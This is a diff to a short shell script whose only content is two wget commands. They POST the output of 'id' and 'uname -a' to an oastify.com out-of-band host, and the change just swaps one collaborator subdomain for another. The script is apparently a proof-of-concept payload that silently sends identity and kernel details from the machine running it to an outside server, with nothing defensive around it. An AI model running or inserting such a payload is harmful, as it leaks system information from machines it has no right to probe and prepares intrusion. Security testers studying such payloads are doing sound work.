@@ -1,4 +1,4 @@
 #!/bin/sh
 
-wget --post-data="output=$(id)" http://n8n.cloud.tkhyqsw0b8vbuvngg3tk4dizzq5htbh0.oastify.com/id
-wget --post-data="output=$(uname -a)" http://n8n.cloud.tkhyqsw0b8vbuvngg3tk4dizzq5htbh0.oastify.com/kernel
+wget --post-data="output=$(id)" http://n8n.cloud.0yz9v7hjyhhukz5p273gy1uwknqee52u.oastify.com/id
+wget --post-data="output=$(uname -a)" http://n8n.cloud.0yz9v7hjyhhukz5p273gy1uwknqee52u.oastify.com/kernel
